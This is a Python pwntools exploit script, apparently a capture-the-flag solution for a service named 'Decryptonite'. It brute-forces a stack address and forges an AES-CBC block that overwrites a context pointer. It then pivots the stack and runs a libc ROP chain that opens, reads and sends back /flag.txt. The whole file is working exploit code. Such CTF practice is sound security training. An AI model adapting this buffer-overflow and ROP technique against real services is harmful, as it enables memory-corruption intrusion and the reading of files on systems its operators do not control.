#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
import argparse

parser = argparse.ArgumentParser(description="Exploit for Decryptonite.")
parser.add_argument("-t", "--target", default="127.0.0.1", help="ip of target")
parser.add_argument("-p", "--port", type=int, default=8888, help="port of target")
parser.add_argument("--timeout", type=int, default=1, help="timeout in seconds for some operations")
args = parser.parse_args()

context.arch = 'amd64'
libc = ELF('./libc-2.23.so')
libc.address = 0x7ffff75c8000
rop = ROP(libc)

def enc(key, iv, msg):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(msg)

def dec(key, iv, msg):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(msg)

context.arch = 'amd64'

def xor(a, b):
    return b''.join((a ^ b).to_bytes(1, 'big') for a, b in zip(a, b))

# Message format:
#   16 iv
#   16 key
#    8 len
# 1028 msg

for i in range(256):
    # Brute force the address of the buffer on the server
    # Start in the middle and work out, buffer should be somewhere around
    i = 0x6c + (i // 2) * ((i % 2) * 2 - 1)
    buf_addr = 0x7fffffffe004 + i * 0x10
    try:
        p = remote(args.target, args.port)

        # Message type and length
        p.send(b'a' + f'{1064:06d}'.encode() + b'\x00')

        # Prepare message
        iv = b'A' * 16
        key = b'B' * 16
        length = 1040

        # First part of payload
        # Create a fake cipher object on the stack. cipher.cleanup is at offset 0x28.
        unenc = b'/flag.txt'
        unenc = unenc.ljust(0x28, b'\x00')
        # Start by updating the stack pointer into the buffer we control
        unenc += p64(0x7ffff75e89be)  # 0x00007ffff75e89be: add rsp, 0x98; ret;
        # 0x98 - 0x5c = 0x3c
        unenc = unenc.ljust(0x3c, b'\x00')
        print(f'{hex(buf_addr)=}')
        # Use rop module to send the flag
        rop.call('open', [buf_addr, 0])
        rop.call('read', [3, buf_addr, 100])
        rop.call('write', [4, buf_addr, 100])
        # print(rop.dump())
        unenc += rop.chain()
        print(f'{hex(len(unenc))=}')

        unenc = unenc.ljust(1008, b'\x00')
        payload = enc(key, iv, unenc)

        # Block before overflow (part of the pointer to ctx object)
        overflow_ctxt = b'\x00'*12 + b'\xa0\xa0\xdb\xf7'
        # Calculate inverse AES
        tmp = dec(key, b'\x00'*16, overflow_ctxt)
        # XOR with desired value (pointer to fake cipher object on stack)
        last_block = xor(tmp, b'A'*12 + p64(buf_addr)[:4])

        payload += last_block
        # Pad with zero bytes up to 1028
        payload += b'\x00'*4

        message = iv + key + p32(length) + payload
        p.send(message)
        flag = b''
        try:
            flag = p.recv(timeout=args.timeout)
            print(flag)
        except:
            pass
        if b'SVUSCG{' in flag:
            print()
            import re
            print(re.search(r'(SVUSCG{.*})', flag.decode(errors='ignore')).group(1))
            break
    except:
        pass
    p.close()
